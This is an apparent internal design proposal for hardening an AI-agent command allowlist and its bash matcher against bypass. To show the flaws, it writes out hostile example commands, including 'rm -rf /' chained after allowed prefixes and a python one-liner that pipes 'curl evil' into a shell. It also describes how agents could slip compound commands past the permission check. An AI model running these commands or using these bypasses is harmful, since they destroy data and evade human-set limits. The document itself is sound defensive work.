# Idea: Allowlist Pattern Hygiene — Remove Bare Bash/Python, Fix Matcher, Reject Shell Metacharacters

> Superseded by `ideas/2026-05-04-ci-review-allowlist-quality-roadmap.md`.
> Keep this file as historical source material; do not implement directly.

## Status: proposed (follow-up quest)

## Origin

Surfaced during PR #94 review (bot findings on `.ai/allowlist.json` + `enforce-allowlist.sh`). User explicitly flagged the allowlist as having security gaps even though the enforcement hook is not wired yet. The allowlist is the source of truth the moment enforcement activates — fixing its content is a prerequisite to turning the hook on.

Scope is tightly **allowlist content + matcher behavior**. This doc does **not** cover role-identification or hook activation — those are tracked in `ideas/2026-04-20-allowlist-enforcement-activation.md`.

## Problems

### 1. Bare program tokens permit arbitrary commands

Current `.ai/allowlist.json` contains entries like `"bash"`, `"python"`, `"python3"` in several roles' `bash` permission list. Combined with the prefix matcher (see below), this means:

- `"bash"` allowed → `bash -c 'rm -rf /'` matches the prefix `bash` → **allowed**.
- `"python"` allowed → `python -c "import os; os.system('curl evil | sh')"` matches prefix `python` → **allowed**.
- `"python3"` allowed → same as python.

Bare tokens defeat the purpose of having an allowlist at all. The matcher can't distinguish intent once the program name matches.

### 2. Prefix matcher lets compound commands through

`.claude/hooks/enforce-allowlist.sh`'s `check_bash` does:

```bash
if [[ "$command" == "$allowed"* ]]; then
  return 0
fi
```

So `allowed="git status"` matches the command `git status && rm -rf /` because the command literally starts with `git status`. Shell metacharacters (`&&`, `||`, `;`, `|`, backticks, `$()`, `>(`, `<(`) are transparent to the matcher.

### 3. `gh pr view.*` is treated as a literal prefix

Multiple role entries contain `"gh pr view.*"`. The matcher treats this as a literal prefix. Result:

- Actual `gh pr view 123` does **not** match (the prefix expects a literal `.` then `*`).
- The intended permission is silently blocked.

Whoever authored this thought the matcher supported regex or extglob. It doesn't.

## Proposal

### 1. Replace bare tokens with explicit program+args

For every role's `bash` list, remove bare `"bash"`, `"python"`, `"python3"`. Replace with specific invocations the role actually needs. Examples (illustrative, not authoritative):

| Role | Replace bare entry with |
|---|---|
| `builder_agent` | `"python3 -m pytest"`, `"python3 -m unittest"`, `"bash scripts/quest_validate-manifest.sh"`, `"bash scripts/quest_validate-quest-config.sh"`, `"bash scripts/quest_validate-quest-state.sh"`, `"bash tests/test-quest-preflight.sh"`, `"bash tests/test-quest-runtime.sh"`, `"bash tests/test-validate-handoff-contracts.sh"`, `"bash tests/test-validate-quest-state.sh"` |
| `fixer_agent` | Same set as builder_agent. |
| `plan_review_a`, `plan_review_b`, `code_review_agent` | `"python3 -m pytest"`. Remove `"python"`, `"python3"`. |

Rationale: every real invocation during a quest is one of a small set of canonical commands. Enumerate them explicitly. "We will add new ones when we need them" is cheap; "we will never allow arbitrary bash" is the guarantee.

### 2. Replace prefix matcher with token-aware matcher

Change `check_bash` from prefix match to a token-aware match with metacharacter rejection. Two layers:

**Layer 1 — Reject compound commands.** Before any allowlist check, reject the command if it contains any of:
- `&&`, `||`, `;`, `|` (pipes/sequences)
- Backticks (`` ` ``), `$()` (command substitution)
- `>(`, `<(` (process substitution)
- Redirection to shell: `>`, `>>` targeting files outside a whitelist (harder to gate cleanly; start by blocking arbitrary `>` to non-path values)

Exception: an explicit allowlist entry may contain these operators IF it is an exact-match entry (see Layer 2). That preserves the ability to allow `bash -lc 'pytest && ruff'` as a single compound entry when explicitly needed.

**Layer 2 — Tokenized first-N-tokens match.** For the remaining simple-command case:
- Split the candidate command on whitespace into tokens.
- For each allowlist entry, split it on whitespace.
- Match if the candidate's first-K tokens equal the entry's K tokens (where K = the entry's token count).

So `"gh pr view"` (3 tokens) matches `gh pr view 123` (first 3 tokens = `gh pr view`). `"python3 -m pytest"` matches `python3 -m pytest tests/unit/` but NOT `python3 -m other`.

Edge cases:
- Quoted arguments: `python3 -c "a b c"` tokenizes naively to `["python3", "-c", "\"a", "b", "c\""]`. For the matcher, using `shlex.split` is safer than naive `split()` but introduces shell-parsing complexity. Start with naive `split` + the metacharacter rejection from Layer 1, which together cover the common cases without needing shell parsing.

**No regex.** Regex in a permission matcher is a foot-cannon. Exact and tokenized-prefix are plenty.

### 3. Fix the three existing `gh pr view.*` entries

Replace `"gh pr view.*"` → `"gh pr view"` (token-count 3, matches `gh pr view <args>`).

## Files to change

- `.ai/allowlist.json` — every role's `bash` list (7 roles: `planner_agent`, `plan_review_a`, `plan_review_b`, `arbiter_agent`, `builder_agent`, `code_review_agent`, `fixer_agent`).
- `.claude/hooks/enforce-allowlist.sh` — replace `check_bash` prefix match with metacharacter rejection + tokenized first-N match.
- Possibly migrate `check_bash` into a Python helper under `scripts/` so unit tests are easier to write (bash testing is possible but tedious; Python is what the rest of the stack uses).

## Tests

A new `tests/unit/test_allowlist_matcher.py` (or the equivalent shell-test file) covering at minimum:

- `"bash"` bare — rejected for all commands when not in allowlist.
- `"bash scripts/quest_validate-manifest.sh"` — allows exact command; blocks `bash scripts/quest_validate-manifest.sh && rm -rf /` (metachar reject); blocks `bash scripts/other.sh` (tokens mismatch).
- `"git status"` (2 tokens) — allows `git status`, `git status --short`; blocks `git status && rm -rf /` (metachar); blocks `git statuss` (token mismatch).
- `"python3 -m pytest"` — allows `python3 -m pytest tests/unit/` (first 3 tokens match); blocks `python3 -m other`.
- `"gh pr view"` — allows `gh pr view 123`, `gh pr view 94 --json`; blocks `gh pr viewall` (token `viewall` != `view`).
- Shell metacharacter matrix: each of `&&`, `||`, `;`, `|`, `` ` ``, `$()`, `>(`, `<(` causes rejection even when the first tokens match.

## Acceptance Criteria

1. No role's `bash` list contains bare `"bash"`, `"python"`, or `"python3"`.
2. Every `"gh pr view.*"` entry is replaced with `"gh pr view"`.
3. The matcher rejects any command containing `&&`, `||`, `;`, `|`, backticks, `$()`, `>(`, `<(` unless the command matches an explicit entry byte-for-byte.
4. The matcher uses tokenized first-N matching, not prefix matching.
5. Unit tests cover the matrix of bypass scenarios and legitimate invocations per the test list above.
6. `bash scripts/quest_validate-manifest.sh` still works end-to-end; `python3 -m pytest` still works end-to-end.

## Out of Scope

- Role-identification mechanism (hook needs to know which role is invoking).
- PreToolUse hook activation in `.claude/settings.json`.
- File-write pattern matching (already uses globs, no comparable bug).
- Additional command coverage (only fixing what's broken, not widening allowlist intent).

## Dependencies

None directly. But **blocks** `ideas/2026-04-20-allowlist-enforcement-activation.md` — turning on the hook without fixing patterns first would block legitimate work AND fail to block real bad commands.

## Priority

High. The allowlist is already shipping content; the content has security holes; any future activation of the hook inherits those holes.

## Follow-up Quest Prompt (Draft)

```text
/quest "Harden .ai/allowlist.json patterns and enforce-allowlist.sh matcher.

Reference: ideas/2026-04-20-allowlist-pattern-hygiene.md

DELIVERABLES

1. Remove bare 'bash', 'python', 'python3' from every role's bash list in
   .ai/allowlist.json. Replace with explicit program+args invocations
   enumerated in the idea doc.

2. Replace every 'gh pr view.*' entry with 'gh pr view' so tokenized
   matching handles the intended wildcard.

3. Rewrite .claude/hooks/enforce-allowlist.sh check_bash (or migrate to a
   Python helper) to:
   - reject compound commands containing &&, ||, ;, |, backticks, $(), >(, <(
     unless the command matches an allowlist entry byte-for-byte;
   - otherwise tokenized first-N match (first K tokens of candidate ==
     K tokens of entry).

4. Add tests/unit/test_allowlist_matcher.py covering:
   - bare-token rejection
   - exact-command allow
   - metacharacter rejection matrix
   - tokenized-prefix behavior (including the gh pr view case)
   - legitimate invocations still work

5. Manual validation: run the existing quest pipeline with the updated
   allowlist active (via the helper, even if the hook is not yet wired)
   and confirm builder/fixer/reviewer pytest + manifest validation still
   pass.

OUT OF SCOPE

- Role-identification mechanism.
- PreToolUse hook activation.
- Widening allowlist intent beyond what roles already need."
```
